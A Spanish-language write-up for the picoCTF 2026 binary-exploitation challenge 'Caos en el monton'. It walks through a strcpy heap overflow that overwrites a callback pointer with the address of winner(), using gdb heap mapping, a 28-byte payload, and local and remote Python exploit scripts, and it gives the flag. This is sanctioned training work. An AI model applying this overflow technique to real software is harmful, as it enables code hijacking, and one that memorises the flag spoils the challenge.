---
title: "Caos en el monton"
permalink: /writeups/caos-en-el-monton/
excerpt: "Writeup del reto 'Caos en el monton' (picoCTF 2026, categoria Explotacion binaria, dificultad Duro, por Yahaya Meddy)."
date: 2026-09-11
categories:
  - picoCTF 2026
  - Binary Exploitation
tags:
  - picoCTF-2026
  - Hard
  - Binary-Exploitation
---

Writeup del reto "Caos en el monton" (picoCTF 2026, categoria Explotacion binaria, dificultad Duro, por Yahaya Meddy).

Un programa recibe dos "nombres" como argumentos de linea de comandos y los copia con strcpy() a dos buffers reservados en el heap. Uno de los buffers es demasiado pequeno, lo que permite desbordarlo y sobrescribir un puntero a funcion ("callback") guardado en la estructura contigua del heap, redirigiendo la ejecucion hacia una funcion oculta ("winner") que imprime flag.txt.

Servidor: nc foggy-cliff.picoctf.net <puerto> (53574 en la sesion resuelta)  
Archivos: binario "vuln" (ELF 32-bit, no PIE, sin canary) y su codigo fuente "vuln.c".

Flag obtenida:  
picoCTF{h34p_0v3rfl0w_501cdf03}

Este archivo recoge los comandos y tecnicas exactos para reproducirlo a mano, en orden.

> **Flag:** `picoCTF{h34p_0v3rfl0w_501cdf03}`

## 1. Lectura del codigo fuente y localizacion del bug

Comando:

```text
cat vuln.c
```

Fragmento clave:

```text
struct internet {
    int priority;
    char *name;
    void (*callback)();
};

void winner() {
    FILE *fp;
    char flag[256];
    fp = fopen("flag.txt", "r");
    ...
    printf("FLAG: %s\n", flag);
}

int main(int argc, char **argv) {
    struct internet *i1, *i2, *i3;
    ...
    i1 = malloc(sizeof(struct internet));
    i1->priority = 1;
    i1->name = malloc(8);          // <-- buffer de solo 8 bytes
    i1->callback = NULL;

    i2 = malloc(sizeof(struct internet));
    i2->priority = 2;
    i2->name = malloc(8);
    i2->callback = NULL;

    strcpy(i1->name, argv[1]);      // <-- SIN limite de tamano
    strcpy(i2->name, argv[2]);

    if (i1->callback) i1->callback();
    if (i2->callback) i2->callback();
    ...
}
```

El bug: "i1->name" solo reserva 8 bytes, pero "strcpy" copia argv[1] completo sin comprobar su longitud. Como los cuatro malloc() se hacen en secuencia (i1, i1->name, i2, i2->name), sus chunks quedan contiguos en el heap -- desbordar i1->name permite escribir dentro de la estructura de i2, incluido su puntero "callback", que el programa llama justo despues si no es NULL. "winner()" nunca se llama desde el flujo normal: hay que redirigir la ejecucion a mano.

## 2. Verificacion de protecciones y direccion de winner()

Comandos:

```text
chmod +x vuln
file vuln
readelf -h vuln | grep Type
readelf -d vuln | grep -E "BIND_NOW|FLAGS"
nm vuln | grep -iE "winner|main|stack_chk"
```

Resultados relevantes:

```text
vuln: ELF 32-bit LSB executable ...           <- NO es PIE (direcciones fijas, sin ASLR de codigo)
(sin BIND_NOW)                                  <- RELRO parcial, irrelevante para este ataque
080492b6 T winner                                <- direccion FIJA de la funcion objetivo
0804936c T main
(no aparece __stack_chk_fail)                   <- sin canary de pila (aunque el bug es de HEAP, no de pila)
```

Al no haber PIE, la direccion de "winner" (0x080492b6) es la MISMA en cada ejecucion y en el servidor remoto -- no hace falta ningun leak para el salto en si.

## 3. Mapeo del heap con gdb -- offsets exactos hasta el callback

Se localiza primero, con objdump, el punto justo despues de los 4 malloc() (antes de los dos strcpy):

```text
objdump -d -M intel --no-show-raw-insn -j .text vuln | sed -n '/<main>:/,/^$/p'
```

Se identifica la direccion 0x8049461 (justo despues de "i2->name = malloc(8)") y se pone un breakpoint ahi con argumentos inofensivos para leer los punteros i1/i2 y el contenido crudo del heap:

```text
gdb -q --batch \
  -ex "break *0x8049461" \
  -ex "run AAAA BBBB" \
  -ex "x/3xw $ebp-0x1c" \
  -ex "x/3xw $ebp-0x20" \
  -ex "print/x *(int*)($ebp-0x1c)" \
  -ex "print/x *(int*)($ebp-0x20)" \
  ./vuln
```

Salida (i1 e i2 apuntan al heap, separados por exactamente 0x20 bytes):

```text
$1 = 0x804e020    (i1)
$2 = 0x804e040    (i2)
```

Volcado crudo de memoria para ver los chunks completos:

```text
gdb -q --batch -ex "break *0x8049461" -ex "run AAAA BBBB" -ex "x/24xw 0x804e018" ./vuln
```

Con esto se reconstruye el layout exacto, relativo al inicio del buffer i1->name (offset 0):

```text
offset  0- 7   i1->name   (los 8 bytes reales del buffer)
offset  8-11   relleno/holgura del mismo chunk de i1->name (inofensivo de pisar)
offset 12-15   campo "size" del chunk de i2 (metadata del heap; inofensivo si no hay free() antes)
offset 16-19   i2->priority
offset 20-23   i2->name   (puntero; el programa hace un SEGUNDO strcpy sobre el, hay que dejarlo valido)
offset 24-27   i2->callback   <-- OBJETIVO: aqui va la direccion de winner()
```

Confirmado tambien que "i1" siempre esta en heap_base+0x20 y "i1->name" en heap_base+0x30, sea cual sea heap_base.

## 4. El obstaculo del ASLR y la solucion con una direccion fija de .bss

Antes de fijar el valor de "i2->name" (offset 20-23), se comprueba si la direccion del heap es estable entre ejecuciones -- necesario para saber si se puede "arreglar" ese puntero con una direccion de heap fija:

```text
for i in 1 2 3 4; do
  gdb -q --batch -ex "set disable-randomization off" \
    -ex "break *0x8049461" -ex "run AAAA BBBB" \
    -ex "print/x *(int*)($ebp-0x1c)" ./vuln
done
```

Resultado: la base del heap CAMBIA en cada ejecucion (0x083c6020, 0x09571020, 0x09f53020, 0x09c80020, ...) -- el ASLR real esta activo para el heap aunque el propio binario no sea PIE. Por tanto NO se puede fijar "i2->name" a una direccion de heap hardcodeada.

Solucion: ya que el binario SI tiene direcciones de codigo y datos fijas (no PIE), se busca una direccion de memoria SIEMPRE mapeada y escribible fuera del heap:

```text
readelf -S vuln | grep -E "\.bss|\.data"
```

Salida:

```text
.data   0804c038   (8 bytes)
.bss    0804c040   (4 bytes)   <-- se usa esta
```

Se fija el puntero corrupto "i2->name" a esta direccion FIJA de .bss (0x0804c040). Como el segundo argumento (argv[2]) solo necesita escribir un puñado de bytes ahi (via el segundo strcpy del programa), no hay riesgo de tocar memoria no mapeada.

## 5. Construccion del payload y prueba local

Con los offsets confirmados (nodo 3) y la direccion de reemplazo fija (nodo 4), el payload para argv[1] es:

```text
20 bytes de relleno ('A' x20)
+ direccion 0x0804c040 en little-endian (4 bytes)   -> nuevo i2->name
+ direccion 0x080492b6 en little-endian (4 bytes)    -> nuevo i2->callback = winner()

Total: 28 bytes
```

Construccion y prueba local en Python (con flag.txt de prueba en el mismo directorio):

```text
echo "flag{local_test}" > flag.txt
python3 -c "
import struct, subprocess
payload = b'A'*20 + struct.pack('<I', 0x0804c040) + struct.pack('<I', 0x080492b6)
r = subprocess.run(['./vuln', payload, b'B'], capture_output=True)
print('RC:', r.returncode)
print(r.stdout.decode(errors='replace'))
"
```

Salida obtenida:

```text
RC: 0
Enter two names separated by space:
FLAG: flag{local_test}
No winners this time, try again!
```

El segundo argumento (argv[2]) puede ser cualquier cadena corta no vacia ('B' es suficiente); no hace falta que este vacia.

## 6. Explotacion contra el servidor remoto y obtencion de la flag

Comprobacion inicial de como el servicio recibe los argumentos (el prompt es el propio printf del binario, y el servidor espera una linea con los dos "nombres" separados por espacio, que reenvia como argv[1] y argv[2]):

```text
nc foggy-cliff.picoctf.net <puerto>
```

Se envia el mismo payload que funciono en local, como una unica linea con los dos argumentos separados por un espacio:

```text
python3 -c "
import socket, struct, time
s = socket.create_connection(('foggy-cliff.picoctf.net', <puerto>), timeout=10)
print(s.recv(4096))
payload = b'A'*20 + struct.pack('<I', 0x0804c040) + struct.pack('<I', 0x080492b6)
s.sendall(payload + b' B\n')
time.sleep(1)
print(s.recv(8192))
s.close()
"
```

Respuesta del servidor:

```text
Enter two names separated by space:
FLAG: picoCTF{h34p_0v3rfl0w_501cdf03}
No winners this time, try again!
```

FLAG: picoCTF{h34p_0v3rfl0w_501cdf03}

Notas finales: no hizo falta ningun leak de direcciones porque el binario no es PIE (direccion de winner() fija) y el puntero intermedio problematico (i2->name) se resolvio apuntandolo a una direccion fija de .bss en vez de a una direccion de heap (que si esta sujeta a ASLR real, verificado en el nodo 4).
